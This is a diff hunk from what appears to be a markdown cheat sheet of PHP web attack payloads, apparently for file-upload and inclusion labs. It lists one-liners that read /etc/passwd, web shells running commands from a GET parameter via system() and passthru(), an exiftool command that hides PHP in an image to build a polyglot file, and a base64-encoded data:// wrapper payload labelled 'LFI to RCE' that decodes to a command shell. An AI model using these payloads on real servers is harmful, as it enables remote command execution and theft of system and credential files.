@@ -5,8 +5,9 @@
 <?php echo file_get_contents('/etc/passwd'); ?> >> To read files
 <?php system($_GET['cmd']); ?> >> For system command
 <?php passthru($_GET['cyborg71']); ?> >> For system command*
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls >> LFI to RCE
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
-php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls
+
 ```
 ## Exploiting Server Configuration
 ___
